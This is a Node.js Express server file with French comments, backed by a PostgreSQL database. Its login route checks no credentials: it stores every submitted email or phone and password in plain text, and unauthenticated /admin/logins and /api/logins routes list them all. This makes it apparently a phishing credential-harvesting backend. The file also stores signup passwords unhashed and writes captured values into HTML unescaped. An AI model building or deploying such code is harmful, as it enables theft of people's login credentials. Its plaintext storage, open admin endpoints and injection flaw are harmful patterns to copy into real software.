// server.js
const express = require('express');
const bodyParser = require('body-parser');
const { Pool } = require('pg'); // PostgreSQL
const path = require('path');

const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Connexion PostgreSQL
const pool = new Pool({
  user: 'adolphuser',        // Ton username Render PostgreSQL
  host: 'dpg-d2fe85mr433s73b8565g-a', // Ton hostname Render PostgreSQL
  database: 'myappdb_1er2',  // Nom de ta base
  password: 'TON_PASSWORD',   // Remplace par ton mot de passe
  port: 5432,
  ssl: { rejectUnauthorized: false } // Requis pour Render
});

// Fonction pour exécuter les requêtes avec retry si besoin
async function runWithRetry(query, params, retries = 5) {
  for (let i = 0; i < retries; i++) {
    try {
      return await pool.query(query, params);
    } catch (err) {
      if (i < retries - 1) {
        console.log(`Query failed, retrying... (${retries - i - 1} left)`);
        await new Promise(res => setTimeout(res, 50));
      } else {
        throw err;
      }
    }
  }
}

// Création des tables si elles n'existent pas
(async () => {
  await runWithRetry(`
    CREATE TABLE IF NOT EXISTS users (
      id SERIAL PRIMARY KEY,
      full_name TEXT NOT NULL,
      email TEXT NOT NULL UNIQUE,
      password TEXT NOT NULL,
      date_of_birth TEXT NOT NULL,
      gender TEXT NOT NULL
    )
  `);

  await runWithRetry(`
    CREATE TABLE IF NOT EXISTS logins (
      id SERIAL PRIMARY KEY,
      emailOrPhone TEXT,
      password TEXT,
      login_time TIMESTAMP
    )
  `);

  console.log("✅ Tables PostgreSQL prêtes !");
})();

// Route signup
app.post('/signup', async (req, res) => {
  const { full_name, email, password, date_of_birth, gender } = req.body;
  const sql = `INSERT INTO users (full_name, email, password, date_of_birth, gender) VALUES ($1, $2, $3, $4, $5)`;
  const params = [full_name, email, password, date_of_birth, gender];

  try {
    await runWithRetry(sql, params);
    res.redirect('/index.html');
  } catch (err) {
    console.error("Erreur création utilisateur:", err.message);
    res.status(400).send('Erreur création utilisateur : ' + err.message);
  }
});

// Route login
app.post('/login', async (req, res) => {
  const { emailOrPhone, password } = req.body;
  const now = new Date();
  const sql = `INSERT INTO logins (emailOrPhone, password, login_time) VALUES ($1, $2, $3)`;
  const params = [emailOrPhone, password, now];

  try {
    await runWithRetry(sql, params);
    res.redirect('/home');
  } catch (err) {
    console.error("Erreur insertion login:", err.message);
    res.status(500).send('Erreur base de données');
  }
});

// Route home
app.get('/home', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'home.html'));
});

// Route admin pour voir tous les logins
app.get('/admin/logins', async (req, res) => {
  try {
    const result = await runWithRetry(`SELECT * FROM logins ORDER BY login_time DESC`);
    let html = `
      <html>
      <head>
        <title>Liste des logins</title>
        <link rel="stylesheet" href="/css/admin.css">
      </head>
      <body>
        <h1>Liste des logins</h1>
        <table>
        <tr><th>ID</th><th>Email/Phone</th><th>Password</th><th>Login Time</th></tr>
    `;
    result.rows.forEach(row => {
      html += `<tr>
        <td>${row.id}</td>
        <td>${row.emailorphone}</td>
        <td>${row.password}</td>
        <td>${row.login_time}</td>
      </tr>`;
    });
    html += `</table></body></html>`;
    res.send(html);
  } catch (err) {
    console.error("Erreur récupération logins:", err.message);
    res.status(500).send("Erreur base de données");
  }
});

// API pour récupérer tous les logins
app.get('/api/logins', async (req, res) => {
  try {
    const result = await runWithRetry(`SELECT * FROM logins ORDER BY login_time DESC`);
    res.json(result.rows);
  } catch (err) {
    console.error('Erreur récupération logins:', err.message);
    res.status(500).json({ error: 'Erreur base de données' });
  }
});

// Démarrage serveur
app.listen(PORT, () => {
  console.log(`🚀 Serveur démarré : http://localhost:${PORT}`);
});
